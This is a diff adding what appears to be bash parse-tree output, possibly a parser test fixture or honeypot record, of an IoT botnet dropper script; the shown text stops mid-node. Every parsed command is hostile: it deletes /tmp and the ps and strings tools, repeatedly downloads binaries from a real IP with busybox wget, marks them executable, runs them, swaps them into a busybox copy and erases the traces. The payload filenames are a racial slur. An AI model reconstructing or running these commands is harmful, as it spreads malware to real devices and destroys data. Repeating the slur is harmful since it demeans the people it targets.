@@ -1,0 +1,747 @@
+CommandNode(lineno=2, pos=(12, 25), parts=[
+  WordNode(lineno=2, pos=(12, 18), word='ulimit'),
+  WordNode(lineno=2, pos=(19, 21), word='-u'),
+  WordNode(lineno=2, pos=(22, 25), word='512'),
+])
+CommandNode(lineno=3, pos=(26, 39), parts=[
+  WordNode(lineno=3, pos=(26, 32), word='ulimit'),
+  WordNode(lineno=3, pos=(33, 35), word='-n'),
+  WordNode(lineno=3, pos=(36, 39), word='512'),
+])
+CommandNode(lineno=4, pos=(40, 47), parts=[
+  WordNode(lineno=4, pos=(40, 42), word='rm'),
+  WordNode(lineno=4, pos=(43, 45), word='-f'),
+  WordNode(lineno=4, pos=(46, 47), word='*'),
+])
+CommandNode(lineno=5, pos=(48, 69), parts=[
+  WordNode(lineno=5, pos=(48, 55), word='busybox'),
+  WordNode(lineno=5, pos=(56, 58), word='rm'),
+  WordNode(lineno=5, pos=(59, 62), word='-rf'),
+  WordNode(lineno=5, pos=(63, 69), word='/tmp/*'),
+])
+CommandNode(lineno=6, pos=(70, 101), parts=[
+  WordNode(lineno=6, pos=(70, 77), word='busybox'),
+  WordNode(lineno=6, pos=(78, 80), word='rm'),
+  WordNode(lineno=6, pos=(81, 84), word='-rf'),
+  WordNode(lineno=6, pos=(85, 101), word='/usr/bin/strings'),
+])
+CommandNode(lineno=7, pos=(102, 128), parts=[
+  WordNode(lineno=7, pos=(102, 109), word='busybox'),
+  WordNode(lineno=7, pos=(110, 112), word='rm'),
+  WordNode(lineno=7, pos=(113, 116), word='-rf'),
+  WordNode(lineno=7, pos=(117, 128), word='/usr/bin/ps'),
+])
+ListNode(lineno=8, pos=(129, 233), parts=[
+  CommandNode(lineno=8, pos=(129, 172), parts=[
+    WordNode(lineno=8, pos=(129, 136), word='busybox'),
+    WordNode(lineno=8, pos=(137, 141), word='wget'),
+    WordNode(lineno=8, pos=(142, 172), word='http://185.103.109.204/nigger1'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(172, 173)),
+  CommandNode(lineno=8, pos=(174, 198), parts=[
+    WordNode(lineno=8, pos=(174, 181), word='busybox'),
+    WordNode(lineno=8, pos=(182, 187), word='chmod'),
+    WordNode(lineno=8, pos=(188, 190), word='+x'),
+    WordNode(lineno=8, pos=(191, 198), word='nigger1'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(198, 199)),
+  CommandNode(lineno=8, pos=(200, 209), parts=[
+    WordNode(lineno=8, pos=(200, 209), word='./nigger1'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(209, 210)),
+  CommandNode(lineno=8, pos=(211, 233), parts=[
+    WordNode(lineno=8, pos=(211, 218), word='busybox'),
+    WordNode(lineno=8, pos=(219, 221), word='rm'),
+    WordNode(lineno=8, pos=(222, 224), word='-f'),
+    WordNode(lineno=8, pos=(225, 233), word='nigger1*'),
+  ]),
+])
+CommandNode(lineno=9, pos=(234, 241), parts=[
+  WordNode(lineno=9, pos=(234, 236), word='rm'),
+  WordNode(lineno=9, pos=(237, 239), word='-f'),
+  WordNode(lineno=9, pos=(240, 241), word='*'),
+])
+ListNode(lineno=10, pos=(242, 346), parts=[
+  CommandNode(lineno=10, pos=(242, 285), parts=[
+    WordNode(lineno=10, pos=(242, 249), word='busybox'),
+    WordNode(lineno=10, pos=(250, 254), word='wget'),
+    WordNode(lineno=10, pos=(255, 285), word='http://185.103.109.204/nigger2'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(285, 286)),
+  CommandNode(lineno=10, pos=(287, 311), parts=[
+    WordNode(lineno=10, pos=(287, 294), word='busybox'),
+    WordNode(lineno=10, pos=(295, 300), word='chmod'),
+    WordNode(lineno=10, pos=(301, 303), word='+x'),
+    WordNode(lineno=10, pos=(304, 311), word='nigger2'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(311, 312)),
+  CommandNode(lineno=10, pos=(313, 322), parts=[
+    WordNode(lineno=10, pos=(313, 322), word='./nigger2'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(322, 323)),
+  CommandNode(lineno=10, pos=(324, 346), parts=[
+    WordNode(lineno=10, pos=(324, 331), word='busybox'),
+    WordNode(lineno=10, pos=(332, 334), word='rm'),
+    WordNode(lineno=10, pos=(335, 337), word='-f'),
+    WordNode(lineno=10, pos=(338, 346), word='nigger2*'),
+  ]),
+])
+CommandNode(lineno=11, pos=(347, 354), parts=[
+  WordNode(lineno=11, pos=(347, 349), word='rm'),
+  WordNode(lineno=11, pos=(350, 352), word='-f'),
+  WordNode(lineno=11, pos=(353, 354), word='*'),
+])
+ListNode(lineno=12, pos=(355, 459), parts=[
+  CommandNode(lineno=12, pos=(355, 398), parts=[
+    WordNode(lineno=12, pos=(355, 362), word='busybox'),
+    WordNode(lineno=12, pos=(363, 367), word='wget'),
+    WordNode(lineno=12, pos=(368, 398), word='http://185.103.109.204/nigger3'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(398, 399)),
+  CommandNode(lineno=12, pos=(400, 424), parts=[
+    WordNode(lineno=12, pos=(400, 407), word='busybox'),
+    WordNode(lineno=12, pos=(408, 413), word='chmod'),
+    WordNode(lineno=12, pos=(414, 416), word='+x'),
+    WordNode(lineno=12, pos=(417, 424), word='nigger3'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(424, 425)),
+  CommandNode(lineno=12, pos=(426, 435), parts=[
+    WordNode(lineno=12, pos=(426, 435), word='./nigger3'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(435, 436)),
+  CommandNode(lineno=12, pos=(437, 459), parts=[
+    WordNode(lineno=12, pos=(437, 444), word='busybox'),
+    WordNode(lineno=12, pos=(445, 447), word='rm'),
+    WordNode(lineno=12, pos=(448, 450), word='-f'),
+    WordNode(lineno=12, pos=(451, 459), word='nigger3*'),
+  ]),
+])
+CommandNode(lineno=13, pos=(460, 467), parts=[
+  WordNode(lineno=13, pos=(460, 462), word='rm'),
+  WordNode(lineno=13, pos=(463, 465), word='-f'),
+  WordNode(lineno=13, pos=(466, 467), word='*'),
+])
+ListNode(lineno=14, pos=(468, 572), parts=[
+  CommandNode(lineno=14, pos=(468, 511), parts=[
+    WordNode(lineno=14, pos=(468, 475), word='busybox'),
+    WordNode(lineno=14, pos=(476, 480), word='wget'),
+    WordNode(lineno=14, pos=(481, 511), word='http://185.103.109.204/nigger4'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(511, 512)),
+  CommandNode(lineno=14, pos=(513, 537), parts=[
+    WordNode(lineno=14, pos=(513, 520), word='busybox'),
+    WordNode(lineno=14, pos=(521, 526), word='chmod'),
+    WordNode(lineno=14, pos=(527, 529), word='+x'),
+    WordNode(lineno=14, pos=(530, 537), word='nigger4'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(537, 538)),
+  CommandNode(lineno=14, pos=(539, 548), parts=[
+    WordNode(lineno=14, pos=(539, 548), word='./nigger4'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(548, 549)),
+  CommandNode(lineno=14, pos=(550, 572), parts=[
+    WordNode(lineno=14, pos=(550, 557), word='busybox'),
+    WordNode(lineno=14, pos=(558, 560), word='rm'),
+    WordNode(lineno=14, pos=(561, 563), word='-f'),
+    WordNode(lineno=14, pos=(564, 572), word='nigger4*'),
+  ]),
+])
+CommandNode(lineno=15, pos=(573, 580), parts=[
+  WordNode(lineno=15, pos=(573, 575), word='rm'),
+  WordNode(lineno=15, pos=(576, 578), word='-f'),
+  WordNode(lineno=15, pos=(579, 580), word='*'),
+])
+ListNode(lineno=16, pos=(581, 685), parts=[
+  CommandNode(lineno=16, pos=(581, 624), parts=[
+    WordNode(lineno=16, pos=(581, 588), word='busybox'),
+    WordNode(lineno=16, pos=(589, 593), word='wget'),
+    WordNode(lineno=16, pos=(594, 624), word='http://185.103.109.204/nigger5'),
+  ]),
+  OperatorNode(lineno=16, op=';', pos=(624, 625)),
+  CommandNode(lineno=16, pos=(626, 650), parts=[
+    WordNode(lineno=16, pos=(626, 633), word='busybox'),
+    WordNode(lineno=16, pos=(634, 639), word='chmod'),
+    WordNode(lineno=16, pos=(640, 642), word='+x'),
+    WordNode(lineno=16, pos=(643, 650), word='nigger5'),
+  ]),
+  OperatorNode(lineno=16, op=';', pos=(650, 651)),
+  CommandNode(lineno=16, pos=(652, 661), parts=[
+    WordNode(lineno=16, pos=(652, 661), word='./nigger5'),
+  ]),
+  OperatorNode(lineno=16, op=';', pos=(661, 662)),
+  CommandNode(lineno=16, pos=(663, 685), parts=[
+    WordNode(lineno=16, pos=(663, 670), word='busybox'),
+    WordNode(lineno=16, pos=(671, 673), word='rm'),
+    WordNode(lineno=16, pos=(674, 676), word='-f'),
+    WordNode(lineno=16, pos=(677, 685), word='nigger5*'),
+  ]),
+])
+CommandNode(lineno=17, pos=(686, 693), parts=[
+  WordNode(lineno=17, pos=(686, 688), word='rm'),
+  WordNode(lineno=17, pos=(689, 691), word='-f'),
+  WordNode(lineno=17, pos=(692, 693), word='*'),
+])
+ListNode(lineno=18, pos=(694, 798), parts=[
+  CommandNode(lineno=18, pos=(694, 737), parts=[
+    WordNode(lineno=18, pos=(694, 701), word='busybox'),
+    WordNode(lineno=18, pos=(702, 706), word='wget'),
+    WordNode(lineno=18, pos=(707, 737), word='http://185.103.109.204/nigger6'),
+  ]),
+  OperatorNode(lineno=18, op=';', pos=(737, 738)),
+  CommandNode(lineno=18, pos=(739, 763), parts=[
+    WordNode(lineno=18, pos=(739, 746), word='busybox'),
+    WordNode(lineno=18, pos=(747, 752), word='chmod'),
+    WordNode(lineno=18, pos=(753, 755), word='+x'),
+    WordNode(lineno=18, pos=(756, 763), word='nigger6'),
+  ]),
+  OperatorNode(lineno=18, op=';', pos=(763, 764)),
+  CommandNode(lineno=18, pos=(765, 774), parts=[
+    WordNode(lineno=18, pos=(765, 774), word='./nigger6'),
+  ]),
+  OperatorNode(lineno=18, op=';', pos=(774, 775)),
+  CommandNode(lineno=18, pos=(776, 798), parts=[
+    WordNode(lineno=18, pos=(776, 783), word='busybox'),
+    WordNode(lineno=18, pos=(784, 786), word='rm'),
+    WordNode(lineno=18, pos=(787, 789), word='-f'),
+    WordNode(lineno=18, pos=(790, 798), word='nigger6*'),
+  ]),
+])
+CommandNode(lineno=19, pos=(799, 806), parts=[
+  WordNode(lineno=19, pos=(799, 801), word='rm'),
+  WordNode(lineno=19, pos=(802, 804), word='-f'),
+  WordNode(lineno=19, pos=(805, 806), word='*'),
+])
+ListNode(lineno=20, pos=(807, 911), parts=[
+  CommandNode(lineno=20, pos=(807, 850), parts=[
+    WordNode(lineno=20, pos=(807, 814), word='busybox'),
+    WordNode(lineno=20, pos=(815, 819), word='wget'),
+    WordNode(lineno=20, pos=(820, 850), word='http://185.103.109.204/nigger7'),
+  ]),
+  OperatorNode(lineno=20, op=';', pos=(850, 851)),
+  CommandNode(lineno=20, pos=(852, 876), parts=[
+    WordNode(lineno=20, pos=(852, 859), word='busybox'),
+    WordNode(lineno=20, pos=(860, 865), word='chmod'),
+    WordNode(lineno=20, pos=(866, 868), word='+x'),
+    WordNode(lineno=20, pos=(869, 876), word='nigger7'),
+  ]),
+  OperatorNode(lineno=20, op=';', pos=(876, 877)),
+  CommandNode(lineno=20, pos=(878, 887), parts=[
+    WordNode(lineno=20, pos=(878, 887), word='./nigger7'),
+  ]),
+  OperatorNode(lineno=20, op=';', pos=(887, 888)),
+  CommandNode(lineno=20, pos=(889, 911), parts=[
+    WordNode(lineno=20, pos=(889, 896), word='busybox'),
+    WordNode(lineno=20, pos=(897, 899), word='rm'),
+    WordNode(lineno=20, pos=(900, 902), word='-f'),
+    WordNode(lineno=20, pos=(903, 911), word='nigger7*'),
+  ]),
+])
+CommandNode(lineno=21, pos=(912, 919), parts=[
+  WordNode(lineno=21, pos=(912, 914), word='rm'),
+  WordNode(lineno=21, pos=(915, 917), word='-f'),
+  WordNode(lineno=21, pos=(918, 919), word='*'),
+])
+ListNode(lineno=22, pos=(920, 1024), parts=[
+  CommandNode(lineno=22, pos=(920, 963), parts=[
+    WordNode(lineno=22, pos=(920, 927), word='busybox'),
+    WordNode(lineno=22, pos=(928, 932), word='wget'),
+    WordNode(lineno=22, pos=(933, 963), word='http://185.103.109.204/nigger8'),
+  ]),
+  OperatorNode(lineno=22, op=';', pos=(963, 964)),
+  CommandNode(lineno=22, pos=(965, 989), parts=[
+    WordNode(lineno=22, pos=(965, 972), word='busybox'),
+    WordNode(lineno=22, pos=(973, 978), word='chmod'),
+    WordNode(lineno=22, pos=(979, 981), word='+x'),
+    WordNode(lineno=22, pos=(982, 989), word='nigger8'),
+  ]),
+  OperatorNode(lineno=22, op=';', pos=(989, 990)),
+  CommandNode(lineno=22, pos=(991, 1000), parts=[
+    WordNode(lineno=22, pos=(991, 1000), word='./nigger8'),
+  ]),
+  OperatorNode(lineno=22, op=';', pos=(1000, 1001)),
+  CommandNode(lineno=22, pos=(1002, 1024), parts=[
+    WordNode(lineno=22, pos=(1002, 1009), word='busybox'),
+    WordNode(lineno=22, pos=(1010, 1012), word='rm'),
+    WordNode(lineno=22, pos=(1013, 1015), word='-f'),
+    WordNode(lineno=22, pos=(1016, 1024), word='nigger8*'),
+  ]),
+])
+CommandNode(lineno=24, pos=(1026, 1033), parts=[
+  WordNode(lineno=24, pos=(1026, 1028), word='rm'),
+  WordNode(lineno=24, pos=(1029, 1031), word='-f'),
+  WordNode(lineno=24, pos=(1032, 1033), word='*'),
+])
+ListNode(lineno=25, pos=(1034, 1245), parts=[
+  CommandNode(lineno=25, pos=(1034, 1077), parts=[
+    WordNode(lineno=25, pos=(1034, 1041), word='busybox'),
+    WordNode(lineno=25, pos=(1042, 1046), word='wget'),
+    WordNode(lineno=25, pos=(1047, 1077), word='http://185.103.109.204/nigger1'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1077, 1078)),
+  CommandNode(lineno=25, pos=(1079, 1105), parts=[
+    WordNode(lineno=25, pos=(1079, 1086), word='busybox'),
+    WordNode(lineno=25, pos=(1087, 1089), word='cp'),
+    WordNode(lineno=25, pos=(1090, 1102), word='/bin/busybox'),
+    WordNode(lineno=25, pos=(1103, 1105), word='./'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1105, 1106)),
+  CommandNode(lineno=25, pos=(1107, 1136), parts=[
+    WordNode(lineno=25, pos=(1107, 1114), word='busybox'),
+    WordNode(lineno=25, pos=(1115, 1118), word='cat'),
+    WordNode(lineno=25, pos=(1119, 1126), word='nigger1'),
+    RedirectNode(lineno=25, output=
+      WordNode(lineno=25, pos=(1129, 1136), word='busybox'), pos=(1127, 1136), type='>'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1136, 1137)),
+  CommandNode(lineno=25, pos=(1138, 1159), parts=[
+    WordNode(lineno=25, pos=(1138, 1145), word='busybox'),
+    WordNode(lineno=25, pos=(1146, 1148), word='rm'),
+    WordNode(lineno=25, pos=(1149, 1151), word='-f'),
+    WordNode(lineno=25, pos=(1152, 1159), word='nigger1'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1159, 1160)),
+  CommandNode(lineno=25, pos=(1161, 1187), parts=[
+    WordNode(lineno=25, pos=(1161, 1168), word='busybox'),
+    WordNode(lineno=25, pos=(1169, 1171), word='cp'),
+    WordNode(lineno=25, pos=(1172, 1179), word='busybox'),
+    WordNode(lineno=25, pos=(1180, 1187), word='nigger1'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1187, 1188)),
+  CommandNode(lineno=25, pos=(1189, 1210), parts=[
+    WordNode(lineno=25, pos=(1189, 1196), word='busybox'),
+    WordNode(lineno=25, pos=(1197, 1199), word='rm'),
+    WordNode(lineno=25, pos=(1200, 1202), word='-f'),
+    WordNode(lineno=25, pos=(1203, 1210), word='busybox'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1210, 1211)),
+  CommandNode(lineno=25, pos=(1212, 1221), parts=[
+    WordNode(lineno=25, pos=(1212, 1221), word='./nigger1'),
+  ]),
+  OperatorNode(lineno=25, op=';', pos=(1221, 1222)),
+  CommandNode(lineno=25, pos=(1223, 1245), parts=[
+    WordNode(lineno=25, pos=(1223, 1230), word='busybox'),
+    WordNode(lineno=25, pos=(1231, 1233), word='rm'),
+    WordNode(lineno=25, pos=(1234, 1236), word='-f'),
+    WordNode(lineno=25, pos=(1237, 1245), word='nigger1*'),
+  ]),
+])
+CommandNode(lineno=26, pos=(1246, 1253), parts=[
+  WordNode(lineno=26, pos=(1246, 1248), word='rm'),
+  WordNode(lineno=26, pos=(1249, 1251), word='-f'),
+  WordNode(lineno=26, pos=(1252, 1253), word='*'),
+])
+ListNode(lineno=27, pos=(1254, 1465), parts=[
+  CommandNode(lineno=27, pos=(1254, 1297), parts=[
+    WordNode(lineno=27, pos=(1254, 1261), word='busybox'),
+    WordNode(lineno=27, pos=(1262, 1266), word='wget'),
+    WordNode(lineno=27, pos=(1267, 1297), word='http://185.103.109.204/nigger2'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1297, 1298)),
+  CommandNode(lineno=27, pos=(1299, 1325), parts=[
+    WordNode(lineno=27, pos=(1299, 1306), word='busybox'),
+    WordNode(lineno=27, pos=(1307, 1309), word='cp'),
+    WordNode(lineno=27, pos=(1310, 1322), word='/bin/busybox'),
+    WordNode(lineno=27, pos=(1323, 1325), word='./'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1325, 1326)),
+  CommandNode(lineno=27, pos=(1327, 1356), parts=[
+    WordNode(lineno=27, pos=(1327, 1334), word='busybox'),
+    WordNode(lineno=27, pos=(1335, 1338), word='cat'),
+    WordNode(lineno=27, pos=(1339, 1346), word='nigger2'),
+    RedirectNode(lineno=27, output=
+      WordNode(lineno=27, pos=(1349, 1356), word='busybox'), pos=(1347, 1356), type='>'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1356, 1357)),
+  CommandNode(lineno=27, pos=(1358, 1379), parts=[
+    WordNode(lineno=27, pos=(1358, 1365), word='busybox'),
+    WordNode(lineno=27, pos=(1366, 1368), word='rm'),
+    WordNode(lineno=27, pos=(1369, 1371), word='-f'),
+    WordNode(lineno=27, pos=(1372, 1379), word='nigger2'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1379, 1380)),
+  CommandNode(lineno=27, pos=(1381, 1407), parts=[
+    WordNode(lineno=27, pos=(1381, 1388), word='busybox'),
+    WordNode(lineno=27, pos=(1389, 1391), word='cp'),
+    WordNode(lineno=27, pos=(1392, 1399), word='busybox'),
+    WordNode(lineno=27, pos=(1400, 1407), word='nigger2'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1407, 1408)),
+  CommandNode(lineno=27, pos=(1409, 1430), parts=[
+    WordNode(lineno=27, pos=(1409, 1416), word='busybox'),
+    WordNode(lineno=27, pos=(1417, 1419), word='rm'),
+    WordNode(lineno=27, pos=(1420, 1422), word='-f'),
+    WordNode(lineno=27, pos=(1423, 1430), word='busybox'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1430, 1431)),
+  CommandNode(lineno=27, pos=(1432, 1441), parts=[
+    WordNode(lineno=27, pos=(1432, 1441), word='./nigger2'),
+  ]),
+  OperatorNode(lineno=27, op=';', pos=(1441, 1442)),
+  CommandNode(lineno=27, pos=(1443, 1465), parts=[
+    WordNode(lineno=27, pos=(1443, 1450), word='busybox'),
+    WordNode(lineno=27, pos=(1451, 1453), word='rm'),
+    WordNode(lineno=27, pos=(1454, 1456), word='-f'),
+    WordNode(lineno=27, pos=(1457, 1465), word='nigger2*'),
+  ]),
+])
+CommandNode(lineno=28, pos=(1466, 1473), parts=[
+  WordNode(lineno=28, pos=(1466, 1468), word='rm'),
+  WordNode(lineno=28, pos=(1469, 1471), word='-f'),
+  WordNode(lineno=28, pos=(1472, 1473), word='*'),
+])
+ListNode(lineno=29, pos=(1474, 1685), parts=[
+  CommandNode(lineno=29, pos=(1474, 1517), parts=[
+    WordNode(lineno=29, pos=(1474, 1481), word='busybox'),
+    WordNode(lineno=29, pos=(1482, 1486), word='wget'),
+    WordNode(lineno=29, pos=(1487, 1517), word='http://185.103.109.204/nigger3'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1517, 1518)),
+  CommandNode(lineno=29, pos=(1519, 1545), parts=[
+    WordNode(lineno=29, pos=(1519, 1526), word='busybox'),
+    WordNode(lineno=29, pos=(1527, 1529), word='cp'),
+    WordNode(lineno=29, pos=(1530, 1542), word='/bin/busybox'),
+    WordNode(lineno=29, pos=(1543, 1545), word='./'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1545, 1546)),
+  CommandNode(lineno=29, pos=(1547, 1576), parts=[
+    WordNode(lineno=29, pos=(1547, 1554), word='busybox'),
+    WordNode(lineno=29, pos=(1555, 1558), word='cat'),
+    WordNode(lineno=29, pos=(1559, 1566), word='nigger3'),
+    RedirectNode(lineno=29, output=
+      WordNode(lineno=29, pos=(1569, 1576), word='busybox'), pos=(1567, 1576), type='>'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1576, 1577)),
+  CommandNode(lineno=29, pos=(1578, 1599), parts=[
+    WordNode(lineno=29, pos=(1578, 1585), word='busybox'),
+    WordNode(lineno=29, pos=(1586, 1588), word='rm'),
+    WordNode(lineno=29, pos=(1589, 1591), word='-f'),
+    WordNode(lineno=29, pos=(1592, 1599), word='nigger3'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1599, 1600)),
+  CommandNode(lineno=29, pos=(1601, 1627), parts=[
+    WordNode(lineno=29, pos=(1601, 1608), word='busybox'),
+    WordNode(lineno=29, pos=(1609, 1611), word='cp'),
+    WordNode(lineno=29, pos=(1612, 1619), word='busybox'),
+    WordNode(lineno=29, pos=(1620, 1627), word='nigger3'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1627, 1628)),
+  CommandNode(lineno=29, pos=(1629, 1650), parts=[
+    WordNode(lineno=29, pos=(1629, 1636), word='busybox'),
+    WordNode(lineno=29, pos=(1637, 1639), word='rm'),
+    WordNode(lineno=29, pos=(1640, 1642), word='-f'),
+    WordNode(lineno=29, pos=(1643, 1650), word='busybox'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1650, 1651)),
+  CommandNode(lineno=29, pos=(1652, 1661), parts=[
+    WordNode(lineno=29, pos=(1652, 1661), word='./nigger3'),
+  ]),
+  OperatorNode(lineno=29, op=';', pos=(1661, 1662)),
+  CommandNode(lineno=29, pos=(1663, 1685), parts=[
+    WordNode(lineno=29, pos=(1663, 1670), word='busybox'),
+    WordNode(lineno=29, pos=(1671, 1673), word='rm'),
+    WordNode(lineno=29, pos=(1674, 1676), word='-f'),
+    WordNode(lineno=29, pos=(1677, 1685), word='nigger3*'),
+  ]),
+])
+CommandNode(lineno=30, pos=(1686, 1693), parts=[
+  WordNode(lineno=30, pos=(1686, 1688), word='rm'),
+  WordNode(lineno=30, pos=(1689, 1691), word='-f'),
+  WordNode(lineno=30, pos=(1692, 1693), word='*'),
+])
+ListNode(lineno=31, pos=(1694, 1905), parts=[
+  CommandNode(lineno=31, pos=(1694, 1737), parts=[
+    WordNode(lineno=31, pos=(1694, 1701), word='busybox'),
+    WordNode(lineno=31, pos=(1702, 1706), word='wget'),
+    WordNode(lineno=31, pos=(1707, 1737), word='http://185.103.109.204/nigger4'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1737, 1738)),
+  CommandNode(lineno=31, pos=(1739, 1765), parts=[
+    WordNode(lineno=31, pos=(1739, 1746), word='busybox'),
+    WordNode(lineno=31, pos=(1747, 1749), word='cp'),
+    WordNode(lineno=31, pos=(1750, 1762), word='/bin/busybox'),
+    WordNode(lineno=31, pos=(1763, 1765), word='./'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1765, 1766)),
+  CommandNode(lineno=31, pos=(1767, 1796), parts=[
+    WordNode(lineno=31, pos=(1767, 1774), word='busybox'),
+    WordNode(lineno=31, pos=(1775, 1778), word='cat'),
+    WordNode(lineno=31, pos=(1779, 1786), word='nigger4'),
+    RedirectNode(lineno=31, output=
+      WordNode(lineno=31, pos=(1789, 1796), word='busybox'), pos=(1787, 1796), type='>'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1796, 1797)),
+  CommandNode(lineno=31, pos=(1798, 1819), parts=[
+    WordNode(lineno=31, pos=(1798, 1805), word='busybox'),
+    WordNode(lineno=31, pos=(1806, 1808), word='rm'),
+    WordNode(lineno=31, pos=(1809, 1811), word='-f'),
+    WordNode(lineno=31, pos=(1812, 1819), word='nigger4'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1819, 1820)),
+  CommandNode(lineno=31, pos=(1821, 1847), parts=[
+    WordNode(lineno=31, pos=(1821, 1828), word='busybox'),
+    WordNode(lineno=31, pos=(1829, 1831), word='cp'),
+    WordNode(lineno=31, pos=(1832, 1839), word='busybox'),
+    WordNode(lineno=31, pos=(1840, 1847), word='nigger4'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1847, 1848)),
+  CommandNode(lineno=31, pos=(1849, 1870), parts=[
+    WordNode(lineno=31, pos=(1849, 1856), word='busybox'),
+    WordNode(lineno=31, pos=(1857, 1859), word='rm'),
+    WordNode(lineno=31, pos=(1860, 1862), word='-f'),
+    WordNode(lineno=31, pos=(1863, 1870), word='busybox'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1870, 1871)),
+  CommandNode(lineno=31, pos=(1872, 1881), parts=[
+    WordNode(lineno=31, pos=(1872, 1881), word='./nigger4'),
+  ]),
+  OperatorNode(lineno=31, op=';', pos=(1881, 1882)),
+  CommandNode(lineno=31, pos=(1883, 1905), parts=[
+    WordNode(lineno=31, pos=(1883, 1890), word='busybox'),
+    WordNode(lineno=31, pos=(1891, 1893), word='rm'),
+    WordNode(lineno=31, pos=(1894, 1896), word='-f'),
+    WordNode(lineno=31, pos=(1897, 1905), word='nigger4*'),
+  ]),
+])
+CommandNode(lineno=32, pos=(1906, 1913), parts=[
+  WordNode(lineno=32, pos=(1906, 1908), word='rm'),
+  WordNode(lineno=32, pos=(1909, 1911), word='-f'),
+  WordNode(lineno=32, pos=(1912, 1913), word='*'),
+])
+ListNode(lineno=33, pos=(1914, 2125), parts=[
+  CommandNode(lineno=33, pos=(1914, 1957), parts=[
+    WordNode(lineno=33, pos=(1914, 1921), word='busybox'),
+    WordNode(lineno=33, pos=(1922, 1926), word='wget'),
+    WordNode(lineno=33, pos=(1927, 1957), word='http://185.103.109.204/nigger5'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(1957, 1958)),
+  CommandNode(lineno=33, pos=(1959, 1985), parts=[
+    WordNode(lineno=33, pos=(1959, 1966), word='busybox'),
+    WordNode(lineno=33, pos=(1967, 1969), word='cp'),
+    WordNode(lineno=33, pos=(1970, 1982), word='/bin/busybox'),
+    WordNode(lineno=33, pos=(1983, 1985), word='./'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(1985, 1986)),
+  CommandNode(lineno=33, pos=(1987, 2016), parts=[
+    WordNode(lineno=33, pos=(1987, 1994), word='busybox'),
+    WordNode(lineno=33, pos=(1995, 1998), word='cat'),
+    WordNode(lineno=33, pos=(1999, 2006), word='nigger5'),
+    RedirectNode(lineno=33, output=
+      WordNode(lineno=33, pos=(2009, 2016), word='busybox'), pos=(2007, 2016), type='>'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(2016, 2017)),
+  CommandNode(lineno=33, pos=(2018, 2039), parts=[
+    WordNode(lineno=33, pos=(2018, 2025), word='busybox'),
+    WordNode(lineno=33, pos=(2026, 2028), word='rm'),
+    WordNode(lineno=33, pos=(2029, 2031), word='-f'),
+    WordNode(lineno=33, pos=(2032, 2039), word='nigger5'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(2039, 2040)),
+  CommandNode(lineno=33, pos=(2041, 2067), parts=[
+    WordNode(lineno=33, pos=(2041, 2048), word='busybox'),
+    WordNode(lineno=33, pos=(2049, 2051), word='cp'),
+    WordNode(lineno=33, pos=(2052, 2059), word='busybox'),
+    WordNode(lineno=33, pos=(2060, 2067), word='nigger5'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(2067, 2068)),
+  CommandNode(lineno=33, pos=(2069, 2090), parts=[
+    WordNode(lineno=33, pos=(2069, 2076), word='busybox'),
+    WordNode(lineno=33, pos=(2077, 2079), word='rm'),
+    WordNode(lineno=33, pos=(2080, 2082), word='-f'),
+    WordNode(lineno=33, pos=(2083, 2090), word='busybox'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(2090, 2091)),
+  CommandNode(lineno=33, pos=(2092, 2101), parts=[
+    WordNode(lineno=33, pos=(2092, 2101), word='./nigger5'),
+  ]),
+  OperatorNode(lineno=33, op=';', pos=(2101, 2102)),
+  CommandNode(lineno=33, pos=(2103, 2125), parts=[
+    WordNode(lineno=33, pos=(2103, 2110), word='busybox'),
+    WordNode(lineno=33, pos=(2111, 2113), word='rm'),
+    WordNode(lineno=33, pos=(2114, 2116), word='-f'),
+    WordNode(lineno=33, pos=(2117, 2125), word='nigger5*'),
+  ]),
+])
+CommandNode(lineno=34, pos=(2126, 2133), parts=[
+  WordNode(lineno=34, pos=(2126, 2128), word='rm'),
+  WordNode(lineno=34, pos=(2129, 2131), word='-f'),
+  WordNode(lineno=34, pos=(2132, 2133), word='*'),
+])
+ListNode(lineno=35, pos=(2134, 2345), parts=[
+  CommandNode(lineno=35, pos=(2134, 2177), parts=[
+    WordNode(lineno=35, pos=(2134, 2141), word='busybox'),
+    WordNode(lineno=35, pos=(2142, 2146), word='wget'),
+    WordNode(lineno=35, pos=(2147, 2177), word='http://185.103.109.204/nigger6'),
